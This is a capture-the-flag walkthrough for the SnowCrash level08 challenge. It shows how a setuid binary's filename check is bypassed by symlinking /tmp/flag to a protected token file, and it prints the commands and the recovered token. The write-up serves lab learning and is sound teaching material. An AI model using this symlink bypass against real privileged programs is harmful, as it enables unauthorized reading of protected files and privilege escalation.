Level08 - Symbolic Link (Symlink) Bypass

Overview
This level involves bypassing a filename-based access control check in a program. The executable refuses to read files named "token" directly, but we can circumvent this restriction using symbolic links.

Solution Steps

Step 1: Enumerate Files
List the files in the level08 directory:

```sh
level08@SnowCrash:~$ ls -l
```

**Output:**
```
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 level08   26 Mar  5  2016 token
```

Key observations:

level08 is a setuid executable owned by flag08
token file is readable only by flag08 user
We need the executable to read the token for us

Step 2: Test the Executable
Run the program without arguments:

```sh
level08@SnowCrash:~$ ./level08
./level08 [file to read]
```
It expects a filename as an argument.

Try to read the token file directly:

```sh
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```
The program blocks access to files named "token"!

Step 3: Identify the Vulnerability

The security flaw:
The program likely checks if the filename contains or ends with "token" but doesn't verify:

The actual file being accessed (follows symlinks)
The absolute path or canonical path
Whether it's a link to a restricted file

Step 4: Create a Symbolic Link
Create a symbolic link with a different name that points to the token file:

```sh
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/flag
```
What this does:

Creates a symbolic link named flag in /tmp/
The link points to the actual token file
The filename "flag" doesn't trigger the security check

Step 5: Bypass the Check and Read the Token
Execute the program with the symbolic link:

```sh
level08@SnowCrash:~$ ./level08 /tmp/flag
quif5eloekouj29ke0vouxean
```
Success! The program:

Checks the filename /tmp/flag (passes the check)
Opens the file, which is actually a link to token
Reads and displays the contents with flag08 privileges
